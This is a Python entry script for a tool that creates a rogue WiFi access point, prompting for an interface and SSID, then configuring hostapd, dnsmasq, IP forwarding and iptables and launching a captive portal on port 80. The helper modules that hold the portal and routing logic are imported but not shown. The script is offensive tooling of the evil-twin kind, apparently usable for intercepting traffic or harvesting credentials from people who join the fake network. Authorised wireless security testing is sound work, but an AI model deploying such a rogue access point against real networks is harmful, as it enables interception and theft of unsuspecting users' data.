import threading
import os
from config_generator import generate_hostapd_config, generate_dnsmasq_config
from network_manager import setup_interface, enable_ip_forwarding, setup_iptables
from service_manager import start_hostapd, start_dnsmasq, stop_all
from captive_portal import run_portal

def main():
    # 🔹 Take user input for interface and SSID
    cmd=os.system("clear")
    print("=== Creating Rougue Access Point ===")
    interface = input("Enter the WiFi interface (e.g., wlan0): ").strip()
    ssid = input("Enter the SSID for the Rogue Access Point: ").strip()

    try:
        print("[+] Generating config files...")
        generate_hostapd_config(interface=interface, ssid=ssid)
        generate_dnsmasq_config(interface=interface)

        print("[+] Setting up interface and routing...")
        setup_interface(interface=interface)
        enable_ip_forwarding()
        setup_iptables(wifi_iface=interface)

        print("[+] Starting hostapd and dnsmasq...")
        hostapd_proc = start_hostapd()
        dnsmasq_proc = start_dnsmasq()

        print("[+] Starting captive portal on port 80...")
        portal_thread = threading.Thread(target=run_portal, daemon=True)
        portal_thread.start()

        input("[*] Press ENTER to stop everything...\n")

    finally:
        print("[!] Shutting down rogue AP and cleaning up...")
        stop_all()

if __name__ == "__main__":
    main()
